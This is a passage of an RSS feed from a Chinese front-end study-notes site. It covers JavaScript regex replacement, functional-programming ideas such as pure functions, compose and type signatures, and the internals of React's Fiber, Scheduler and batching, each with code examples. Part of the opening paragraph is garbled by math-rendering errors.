<p>把 &quot;2+3=5&quot;，变成 &quot;2+3=2+3=5=5&quot;。要把 &quot;2+3=5&quot;，变成 &quot;2+3=2+3=5=5&quot;，其实就是想办法把 = 替换成=2+3=5=，其中，$&amp; 匹配的是 =， <span><span><i>Not supported content</i></span><span aria-hidden="true"><span><span style="height:1.0301em;vertical-align:-0.0833em;"></span><span><span><span><span style="height:0.9468em;"><span style="top:-3em;"><span style="height:3em;"></span><span>匹</span></span><span style="top:-3.2523em;"><span style="height:3em;"></span><span style="left:-0.25em;"><span>ˋ</span></span></span></span></span></span></span><span>配的是</span><span>2</span><span style="margin-right:0.2222em;"></span><span>+</span><span style="margin-right:0.2222em;"></span></span><span><span style="height:0.6833em;"></span><span>3</span><span>，</span></span></span></span>' 匹配的是 5。因此使用 &quot;<span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;&amp;&#039; at position 1: &amp;̲'>&amp;</span>`<span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;&amp;&#039; at position 1: &amp;̲'>&amp;</span>'$&amp;&quot; 便达成了目的。</p>
</blockquote>
<div><pre><code><span>var</span> result <span>=</span> <span>'2+3=5'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>=</span><span>/</span></span><span>,</span> <span>"$&amp;$`$&amp;$'$&amp;"</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>result<span>)</span>
<span>// => "2+3=2+3=5=5"</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><ul>
<li>当第二个参数是函数时，我们需要注意该回调函数的参数具体是什么？</li>
</ul>
<div><pre><code><span>'1234 2345 3456'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(\d)\d{2}(\d)</span><span>/</span><span>g</span></span><span>,</span> <span>function</span><span>(</span>
  <span>match<span>,</span>
  $1<span>,</span>
  $2<span>,</span>
  index<span>,</span>
  input</span>
<span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>[</span>match<span>,</span> $1<span>,</span> $2<span>,</span> index<span>,</span> input<span>]</span><span>)</span>
<span>}</span><span>)</span>
<span>// => ["1234", "1", "4", 0, "1234 2345 3456"]</span>
<span>// => ["2345", "2", "5", 5, "1234 2345 3456"]</span>
<span>// => ["3456", "3", "6", 10, "1234 2345 3456"]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><hr>
<section>
<ol>
<li id="footnote1"><p>0-9A-Za-z </p>
</li>
</ol>
</section>
]]></content:encoded>
    </item>
    <item>
      <title>函数式编程指北</title>
      <link>https://www.matrixtheone.ga/web/note/books/Mostly-Adequate-Guide/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/Mostly-Adequate-Guide/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">函数式编程指北</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-纯函数的好处"> 1. 纯函数的好处</h2>
<ul>
<li>
<p>纯函数概念：纯函数是这样一种函数，即相同的输入，永远会得到相同的输出，而且没有任何可观察的副作用。</p>
</li>
<li>
<p>在不纯的版本中，checkAge 的结果将取决于 minimum 这个可变变量的值。换句话说，它取决于系统状态（system state）。这一点令人沮丧，因为它引入了外部的环境，从而增加了认知负荷（cognitive load）。</p>
</li>
</ul>
<div><pre><code><span>// 不纯的</span>
<span>var</span> minimum <span>=</span> <span>21</span>

<span>var</span> <span>checkAge</span> <span>=</span> <span>function</span><span>(</span><span>age</span><span>)</span> <span>{</span>
  <span>return</span> age <span>>=</span> minimum
<span>}</span>

<span>// 纯的</span>
<span>var</span> <span>checkAge</span> <span>=</span> <span>function</span><span>(</span><span>age</span><span>)</span> <span>{</span>
  <span>var</span> minimum <span>=</span> <span>21</span>
  <span>return</span> age <span>>=</span> minimum
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><ul>
<li>
<p>副作用：副作用是在计算结果的过程中，系统状态的一种变化，或者与外部世界进行的可观察的交互。</p>
</li>
<li>
<p>只要是跟函数外部环境发生的交互就都是副作用 —— 这一点可能会让你怀疑无副作用编程的可行性。函数式编程的哲学就是假定副作用是造成不正当行为的主要原因。这并不是说，要禁止使用一切副作用，而是说，要让它们在可控的范围内发生。</p>
</li>
<li>
<p>戏剧性的是：纯函数就是数学上的函数，而且是函数式编程的全部。使用这些纯函数编程能够带来大量的好处。</p>
</li>
<li>
<p>值得注意的一点是，可以通过延迟执行的方式把不纯的函数转换为纯函数。</p>
<blockquote>
<p>这里有趣的地方在于我们并没有真正发送 http 请求——只是返回了一个函数，当调用它的时候才会发请求。这个函数之所以有资格成为纯函数，是因为它总是会根据相同的输入返回相同的输出：给定了 url 和 params 之后，它就只会返回同一个发送 http 请求的函数。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>var</span> pureHttpCall <span>=</span> <span>memoize</span><span>(</span><span>function</span><span>(</span><span>url<span>,</span> params</span><span>)</span> <span>{</span>
  <span>return</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> $<span>.</span><span>getJSON</span><span>(</span>url<span>,</span> params<span>)</span>
  <span>}</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li>
<p>追求“纯”的理由。</p>
<ol>
<li>可缓存性（利用闭包）：纯函数总能够根据输入来做缓存。</li>
<li>可移植性/自文档化：纯函数是完全自给自足的，它需要的所有东西都能轻易获得。</li>
<li>可测试性：纯函数让测试更加容易。只需简单地给函数一个输入，然后断言输出就好了。</li>
<li>合理性：很多人相信使用纯函数最大的好处是引用透明性。如果一段代码可以替换成它执行所得的结果，而且是在不改变整个程序行为的前提下替换的，那么我们就说这段代码是引用透明的。</li>
</ol>
</li>
</ul>
<h2 id="_2-代码组合"> 2. 代码组合</h2>
<ul>
<li>这就是组合（compose）。f 和 g 都是函数，x 是在它们之间通过“管道”传输的值。</li>
</ul>
<div><pre><code><span>var</span> <span>compose</span> <span>=</span> <span>function</span><span>(</span><span>f<span>,</span> g</span><span>)</span> <span>{</span>
  <span>return</span> <span>function</span><span>(</span><span>x</span><span>)</span> <span>{</span>
    <span>return</span> <span>f</span><span>(</span><span>g</span><span>(</span>x<span>)</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li>
<p>pointfree 模式：函数无须提及将要操作的数据是什么样的。</p>
<blockquote>
<p>pointfree 模式能够帮助我们减少不必要的命名，让代码保持简洁和通用。对函数式代码来说，pointfree 是非常好的石蕊试验，因为它能告诉我们一个函数是否是接受输入返回输出的小函数。比如，while 循环是不能组合的。不过你也要警惕，pointfree 就像是一把双刃剑，有时候也能混淆视听。并非所有的函数式代码都是 pointfree 的，不过这没关系。可以使用它的时候就使用，不能使用的时候就用普通函数。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>// 非 pointfree，因为提到了数据：name</span>
<span>var</span> <span>initials</span> <span>=</span> <span>function</span><span>(</span><span>name</span><span>)</span> <span>{</span>
  <span>return</span> name
    <span>.</span><span>split</span><span>(</span><span>' '</span><span>)</span>
    <span>.</span><span>map</span><span>(</span><span>compose</span><span>(</span>toUpperCase<span>,</span> head<span>)</span><span>)</span>
    <span>.</span><span>join</span><span>(</span><span>'. '</span><span>)</span>
<span>}</span>

<span>// pointfree</span>
<span>var</span> initials <span>=</span> <span>compose</span><span>(</span><span>join</span><span>(</span><span>'. '</span><span>)</span><span>,</span> <span>map</span><span>(</span><span>compose</span><span>(</span>toUpperCase<span>,</span> head<span>)</span><span>)</span><span>,</span> <span>split</span><span>(</span><span>' '</span><span>)</span><span>)</span>

<span>initials</span><span>(</span><span>'hunter stockton thompson'</span><span>)</span>
<span>// 'H. S. T'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><ul>
<li>debug 组合：组合的一个常见错误是，在没有局部调用之前，就组合类似 map 这样接受两个参数的函数。</li>
</ul>
<div><pre><code><span>// 错误做法：我们传给了 `angry` 一个数组，根本不知道最后传给 `map` 的是什么东西。</span>
<span>var</span> latin <span>=</span> <span>compose</span><span>(</span>map<span>,</span> angry<span>,</span> reverse<span>)</span>

<span>latin</span><span>(</span><span>[</span><span>'frog'</span><span>,</span> <span>'eyes'</span><span>]</span><span>)</span>
<span>// error</span>

<span>// 正确做法：每个函数都接受一个实际参数。</span>
<span>var</span> latin <span>=</span> <span>compose</span><span>(</span><span>map</span><span>(</span>angry<span>)</span><span>,</span> reverse<span>)</span>

<span>latin</span><span>(</span><span>[</span><span>'frog'</span><span>,</span> <span>'eyes'</span><span>]</span><span>)</span>
<span>// ["EYES!", "FROG!"])</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><ul>
<li>同步通用组合函数。</li>
</ul>
<div><pre><code><span>const</span> <span>compose</span> <span>=</span> <span>(</span><span><span>...</span>fns</span><span>)</span> <span>=></span> <span>result</span> <span>=></span> <span>{</span>
  <span>const</span> list <span>=</span> fns<span>.</span><span>slice</span><span>(</span><span>)</span>
  <span>while</span> <span>(</span>list<span>.</span>length <span>></span> <span>0</span><span>)</span> result <span>=</span> list<span>.</span><span>pop</span><span>(</span><span>)</span><span>(</span>result<span>)</span>
  <span>return</span> result
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li>异步通用组合函数。</li>
</ul>
<div><pre><code><span>const</span> <span>composePromise</span> <span>=</span> <span>(</span><span><span>...</span>actions</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> init <span>=</span> actions<span>.</span><span>pop</span><span>(</span><span>)</span>
  <span>return</span> <span>(</span><span><span>...</span>args</span><span>)</span> <span>=></span>
    actions
      <span>.</span><span>reverse</span><span>(</span><span>)</span>
      <span>.</span><span>reduce</span><span>(</span>
        <span>(</span><span>sequence<span>,</span> func</span><span>)</span> <span>=></span> sequence<span>.</span><span>then</span><span>(</span><span>result</span> <span>=></span> <span>func</span><span>(</span>result<span>)</span><span>)</span><span>,</span>
        Promise<span>.</span><span>resolve</span><span>(</span><span>init</span><span>(</span><span>...</span>args<span>)</span><span>)</span>
      <span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><ul>
<li>
<p><a href="https://juejin.cn/post/6971260867300032525" target="_blank" rel="noopener noreferrer">XDM，JS 如何函数式编程？看这就够了！（三） - 掘金安东尼</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/6989020415444123662" target="_blank" rel="noopener noreferrer">感谢 compose 函数，让我的代码屎山 💩 逐渐美丽了起来~ - 掘金安东尼</a></p>
</li>
</ul>
<h2 id="_3-hindley-milner-类型签名"> 3. Hindley-Milner 类型签名</h2>
<ul>
<li>类型签名在写纯函数时所起的作用非常大，大到英语都不能望其项背。这些签名轻轻诉说着函数最不可告人的秘密。短短一行，就能暴露函数的行为和目的。</li>
</ul>
<div><pre><code><span>//  strLength :: String -> Number</span>
<span>var</span> <span>strLength</span> <span>=</span> <span>function</span><span>(</span><span>s</span><span>)</span> <span>{</span>
  <span>return</span> s<span>.</span>length
<span>}</span>

<span>//  join :: String -> [String] -> String</span>
<span>var</span> join <span>=</span> <span>curry</span><span>(</span><span>function</span><span>(</span><span>what<span>,</span> xs</span><span>)</span> <span>{</span>
  <span>return</span> xs<span>.</span><span>join</span><span>(</span>what<span>)</span>
<span>}</span><span>)</span>

<span>//  match :: Regex -> String -> [String]</span>
<span>var</span> match <span>=</span> <span>curry</span><span>(</span><span>function</span><span>(</span><span>reg<span>,</span> s</span><span>)</span> <span>{</span>
  <span>return</span> s<span>.</span><span>match</span><span>(</span>reg<span>)</span>
<span>}</span><span>)</span>

<span>//  replace :: Regex -> String -> String -> String</span>
<span>var</span> replace <span>=</span> <span>curry</span><span>(</span><span>function</span><span>(</span><span>reg<span>,</span> sub<span>,</span> s</span><span>)</span> <span>{</span>
  <span>return</span> s<span>.</span><span>replace</span><span>(</span>reg<span>,</span> sub<span>)</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><ul>
<li>map 接受两个参数，第一个是从任意类型 a 到任意类型 b 的函数。第二个是一个数组，元素是任意类型的 a。map 最后返回的是一个类型 b 的数组。</li>
</ul>
<div><pre><code><span>//  map :: (a -> b) -> [a] -> [b]</span>
<span>var</span> map <span>=</span> <span>curry</span><span>(</span><span>function</span><span>(</span><span>f<span>,</span> xs</span><span>)</span> <span>{</span>
  <span>return</span> xs<span>.</span><span>map</span><span>(</span>f<span>)</span>
<span>}</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><img :src="$withBase('/images/Mostly-Adequate-Guide/Ang Lee.gif')" loading="lazy">
]]></content:encoded>
    </item>
    <item>
      <title>深入浅出 Node.js</title>
      <link>https://www.matrixtheone.ga/web/note/books/Node/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/Node/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">深入浅出 Node.js</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>书籍阅读</title>
      <link>https://www.matrixtheone.ga/web/note/books/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">书籍阅读</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<img :src="$withBase('/images/Movie/红楼梦.webp')">
]]></content:encoded>
    </item>
    <item>
      <title>React 设计原理</title>
      <link>https://www.matrixtheone.ga/web/note/books/React-Design/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/React-Design/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">React 设计原理</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-前端框架原理概览"> 1. 前端框架原理概览</h2>
<ul>
<li>
<p>AOT：代码在构建时，被称为 AOT（Ahead Of Time，提前编译或预编译），宿主环境获得的是编译后的代码。</p>
</li>
<li>
<p>JIT：代码在宿主环境执行时，被称为 JIT（Just In Time，即时编译），代码在宿主环境中编译并执行。</p>
</li>
<li>
<p>如果模板上有错误。使用 AOT 时，会在编译阶段报出；而 JIT 需要等到在浏览器中执行到错误代码时，才会报出。</p>
</li>
<li>
<p>使用 JIT 的应用在首次加载时慢于使用 AOT 的应用，因为其需要先编译代码；而使用 AOT 的应用已经在构建时完成编译，可以直接执行代码。</p>
</li>
<li>
<p>使用 JIT 的应用代码体积可能大于使用 AOT 的应用，因为其在运行时会增加编译器代码。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>框架</th>
<th>重渲染层级分类</th>
<th>编译技术分类</th>
</tr>
</thead>
<tbody>
<tr>
<td>Svelte</td>
<td>元素级框架</td>
<td>极致的编译时框架</td>
</tr>
<tr>
<td>Vue</td>
<td>组件级框架</td>
<td>拥有两者的特效（AOT 和 VDOM），比较均衡</td>
</tr>
<tr>
<td>React</td>
<td>应用级框架</td>
<td>极致的运行时框架</td>
</tr>
</tbody>
</table>
<h2 id="_2-react-理念"> 2. React 理念</h2>
<ul>
<li>Fiber Reconciler 采用双缓冲的更新机制。对于每个应用，同时存在两颗 Fiber Tree，Current Fiber Tree 对应真实 UI，Wip Fiber Tree 对应“正在内存中构建的 UI”。</li>
</ul>
<h2 id="_3-render-阶段"> 3. render 阶段</h2>
<ul>
<li>
<p>Fiber Reconciler 是从 Stack Reconciler 重构而来，通过遍历的方式实现可中断的递归，因此 performUnitOfWork 的工作可以分为两部分：“递”和“归”。</p>
<blockquote>
<ul>
<li>“递”阶段会从 HostRootFiber 开始向下以 DFS 的方式遍历，为“遍历到的每个 fiberNode”执行 beginWork 方法。该方法会根据传入的 fiberNode 创建下一级 fiberNode。当遍历到叶子元素（不包含子 fiberNode）时，performUnitOfWork 就会进入“归”阶段。</li>
<li>“归”阶段会调用 completeWork 方法处理 fiberNode。当某个 fiberNode 执行完 completeWork 方法后，如果其存在兄弟 fiberNode（fiberNode.sibling !== null），会进入其兄弟 fiberNode 的“递”阶段。如果不存在兄弟 fiberNode，则进入父 fiberNode 的“归”阶段。“递”阶段和“归”阶段会交错执行直至 HostRootFiber 的“归”阶段。至此，render 阶段的工作结束。</li>
</ul>
</blockquote>
<div><pre><code><span>function</span> <span>App</span><span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span>div</span><span>></span></span><span>
      Hello
      </span><span><span><span>&lt;</span>span</span><span>></span></span><span>World</span><span><span><span>&lt;/</span>span</span><span>></span></span><span>
    </span><span><span><span>&lt;/</span>div</span><span>></span></span>
  <span>)</span>
<span>}</span>

<span>/**
 * 1. HostRootFiber beginWork（生成 App fiberNode）
 * 2. App fiberNode beginWork（生成 DIV fiberNode）
 * 3. DIV fiberNode beginWork（生成 'Hello'、SPAN fiberNode）
 * 4. 'Hello' fiberNode beginWork（叶子元素）
 * 5. 'Hello' fiberNode completeWork
 * 6. SPAN fiberNode beginWork（叶子元素）
 * 7. SPAN fiberNode completeWork
 * 8. DIV fiberNode completeWork
 * 9. APP fiberNode completeWork
 * 10. HostRootFiber completeWork
 */</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div></li>
<li>
<p>beginWork 会根据当前 fiberNode 创建下一级 fiberNode，在 update 时标记 Placement（新增、移动）、ChildDeletion（删除）。completeWork 在 mount 时会构建 DOM Tree，初始化属性，在 update 时标记 Update（属性更新），最终执行 flags 冒泡。</p>
</li>
</ul>
<h2 id="_4-commit-阶段"> 4. commit 阶段</h2>
<ul>
<li>
<p>render 阶段流程可能会被打断，而 commit 阶段一旦开始就会同步执行直到完成。</p>
<blockquote>
<ul>
<li>开始前准备的工作，比如判断 “是否有副作用需要执行”</li>
<li>处理副作用（BeforeMutation 阶段、Mutation 阶段、Layout 阶段）</li>
<li>结束后的收尾工作，比如调度新的更新</li>
</ul>
</blockquote>
</li>
<li>
<p>Fiber Tree 的切换会在 Mutation 阶段完成后，Layout 阶段还未开始时执行。</p>
</li>
<li>
<p>Fiber 架构的早期版本并没有使用 subtreeFlags，而是使用一种被称为 Effects list 的链表结构保存 “被标记副作用的 fiberNode”。虽然 subtreeFlags 遍历子树的操作需要比 Effect list 遍历更多节点，但是 v18 中 Suspense 的行为恰恰需要遍历子树。<a href="https://juejin.cn/post/7036155759121399821" target="_blank" rel="noopener noreferrer">React Effects List 大重构，是为了他？</a></p>
<div><pre><code><span>function</span> <span>App</span><span>(</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span><span>Suspense</span></span> <span>fallback</span><span><span>=</span><span>{</span><span><span><span>&lt;</span>h3</span><span>></span></span><span>loading...</span><span><span><span>&lt;/</span>h3</span><span>></span></span><span>}</span></span><span>></span></span><span>
      </span><span><span><span>&lt;</span><span>LazyCpn</span></span> <span>/></span></span><span>
      </span><span><span><span>&lt;</span><span>Sibling</span></span> <span>/></span></span><span>
    </span><span><span><span>&lt;/</span><span>Suspense</span></span><span>></span></span>
  <span>)</span>
<span>}</span>

<span>function</span> <span>Sibling</span><span>(</span><span>)</span> <span>{</span>
  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>'Sibling effect'</span><span>)</span>
  <span>}</span><span>,</span> <span>[</span><span>]</span><span>)</span>

  <span>return</span> <span><span><span>&lt;</span>h1</span><span>></span></span><span>Sibling</span><span><span><span>&lt;/</span>h1</span><span>></span></span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><div><pre><code><span>&lt;!-- 旧Suspense，并且会打印 Sibling effect --></span>
<span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>root<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>h1</span> <span><span>style</span><span><span>=</span><span>"</span><span><span>display</span><span>:</span> none <span>!important</span><span>;</span></span><span>"</span></span></span><span>></span></span>Sibling<span><span><span>&lt;/</span>h1</span><span>></span></span>
  <span><span><span>&lt;</span>h3</span><span>></span></span>loading<span><span><span>&lt;/</span>h3</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>

<span>&lt;!-- 新Suspense --></span>
<span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>root<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>h3</span><span>></span></span>loading<span><span><span>&lt;/</span>h3</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div></li>
</ul>
<h2 id="_5-schedule-阶段"> 5. schedule 阶段</h2>
<ul>
<li>
<p>为了更灵活地控制宏任务的执行时机，React 实现了一套基于 lane 模型的优先级算法，并基于这套算法实现了 Batched Update（批量更新）、任务打断/恢复机制等低级特性。</p>
</li>
<li>
<p>Scheduler 预置了五种优先级，优先级依次降低：</p>
<blockquote>
<ul>
<li>ImmediatePriority（最高优先级，同步执行）</li>
<li>UserBlockingPriority</li>
<li>NormalPriority</li>
<li>LowPriority</li>
<li>IdlePriority（最低优先级）</li>
</ul>
</blockquote>
</li>
<li>
<p>为了解决饥饿问题，当一个 work 长时间未执行完，随着时间推移，当前时间离 work.expirationTime 越近，代表 work 优先级越高。当 work.expirationTime 小于当前时间，代表该 work 过期，表现为 didTimeout === true，过期 work 会被同步执行。</p>
</li>
<li>
<p>使用 “小顶堆” 实现优先级队列。因为在 Scheduler 中经常需要获取 timerQueue、taskQueue “排序依据最小的值” 对应 task，所以选用 “小顶堆” 这一数据结构。</p>
</li>
<li>
<p>宏任务的选择。</p>
<ul>
<li>
<p>requestIdleCallback <code>未采用</code>，rIC 的设计初衷是 “能够在事件循环中执行低优先级工作，减少对动画、用户输入等高优先级事件的影响”。这意味着 rIC 的应用场景被局限在 “低优先级工作” 中。这与 Scheduler 中 “多种优先级的调度策略” 不符。</p>
<blockquote>
<ul>
<li>浏览器兼容性。</li>
<li>执行频率不稳定，受很多因素影响。（比如：当切换浏览器 Tab 后，之前 Tab 注册的 rIC 执行的频率会大幅降低）</li>
<li>应用场景局限。</li>
</ul>
</blockquote>
</li>
<li>
<p>requestAnimationFrame <code>未采用</code>，由于 rAF 的执行取决于 “每一帧 Paint 前的时机”，即 “它的执行与帧相关”，执行频率并不高，因此 Scheduler 并没有选择它。满足条件的备选项应该在一帧时间内可以执行多次，并且执行时机越早越好。</p>
</li>
<li>
<p>setImmediate，在支持 setImmediate 的环境（Node.js、旧版本 IE）中，Scheduler 使用 setImmediate 调度宏任务。</p>
<blockquote>
<ul>
<li>不同于 MessageChannel，他不会阻止 Node.js 进程退出。</li>
<li>相比 MessageChannel，执行时机更早。</li>
</ul>
</blockquote>
</li>
<li>
<p>MessageChannel，在支持 MessageChannel 的环境（浏览器、Worker）中，使用 MessageChannel 调度宏任务。</p>
</li>
<li>
<p>setTimeout，其余情况则使用 setTimeout 调度宏任务，如果使用 setTimeout 调度新的宏任务，那么 Time Slice 之间会用 “被浪费的时间”。考虑 setTimeout 存在最小延迟时间，且在一帧中其执行时机晚于上诉两个 API，所以 “被浪费的时间” 应该略大于最小延迟时间。</p>
</li>
</ul>
</li>
<li>
<p>v18 的 Batched Updates（批量更新）被称为 Automatic Bathing（自动批量更新），是因为在 v18 中，Batched Updates 是由 “基于 lane 模型的调度策略” 自动完成的。之前版本的 React 中则是半自动批量更新与手动批量更新。</p>
</li>
<li>
<p>不管是同步还是异步，所有更新都会经历 schedule 阶段，v18 将自动批量更新交由 schedule 阶段的调度策略完成，实现了自动化。具体来讲，v18 将 “优先级” 作为自动批量更新的依据。对于 SyncLane，更新会在微任务队列中被调度执行。对于非 SyncLane，当有 work 正在调度时产生了 “同优先级” 的新 work，新 work 会命中该逻辑，不会产生新的调度。这意味着在上诉 “setTimeout 回调中触发多次更新” 的场景中，第一次更新会产生调度，后续更新都会命中上诉逻辑，不会产生新的调度。这就是 v18 中 “自动批量更新” 的实现原理。</p>
</li>
<li>
<p>React 同时存在 “使用微任务调度的同步调度策略” 与 “使用宏任务调度的并发调度策略”，这使得其自动批量更新也有两种可能。</p>
<div><pre><code><span>let</span> count <span>=</span> <span>0</span>
<span>let</span> dom
<span>const</span> <span>onClick</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>// 三次更新合并为一次</span>
  count<span>++</span>
  count<span>++</span>
  count<span>++</span>
  <span>console</span><span>.</span><span>log</span><span>(</span><span>'同步结果：'</span><span>,</span> dom<span>.</span>innerText<span>)</span>
  <span>Promise</span><span>.</span><span>resolve</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>'微任务结果：'</span><span>,</span> dom<span>.</span>innerText<span>)</span>
  <span>}</span><span>)</span>
  <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>'宏任务结果：'</span><span>,</span> dom<span>.</span>innerText<span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

<span>/**
 * Vue3
 * 同步结果：0；微任务结果：3；宏任务结果：3
 *
 * Svelte
 * 同步结果：0；微任务结果：3；宏任务结果：3
 *
 * Legacy Mode React
 * 同步结果：0；微任务结果：3；宏任务结果：3
 *
 * Concurrent Mode React
 * 同步结果：0；微任务结果：0；宏任务结果：3
 */</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div></li>
</ul>
<h2 id="_6-状态更新流程"> 6. 状态更新流程</h2>
<ul>
<li>
<p>在触发更新时存在一种性能优化策略 —— eagerState。进入 render 阶段后存在一种性能优化策略 —— bailout。<a href="https://zhuanlan.zhihu.com/p/474717897" target="_blank" rel="noopener noreferrer">React 内部让人迷惑的性能优化策略</a></p>
<div><pre><code><span>function</span> App <span>{</span>
  <span>const</span> <span>[</span>num<span>,</span> updateNum<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>0</span><span>)</span><span>;</span>
  <span>console</span><span>.</span><span>log</span><span>(</span><span>'App render'</span><span>,</span> num<span>)</span><span>;</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>setInterval</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>updateNum</span><span>(</span><span>1</span><span>)</span><span>;</span>
    <span>}</span><span>,</span> <span>1000</span><span>)</span>
  <span>}</span><span>,</span> <span>[</span><span>]</span><span>)</span>

  <span>return</span> <span><span><span>&lt;</span><span>Child</span></span><span>/></span></span><span>;</span>
<span>}</span>

<span>function</span> <span>Child</span><span>(</span><span>)</span> <span>{</span>
  <span>console</span><span>.</span><span>log</span><span>(</span><span>'child render'</span><span>)</span><span>;</span>
  <span>return</span> <span><span><span>&lt;</span>span</span><span>></span></span><span>child</span><span><span><span>&lt;/</span>span</span><span>></span></span><span>;</span>
<span>}</span>

<span>/**
 * App render 0（未命中策略）
 * child render
 * App render 1（未命中策略）
 * child render
 * App render 1（命中bailout）
 * （命中eagerState）
 * （命中eagerState）
*/</span>
</code></pre>
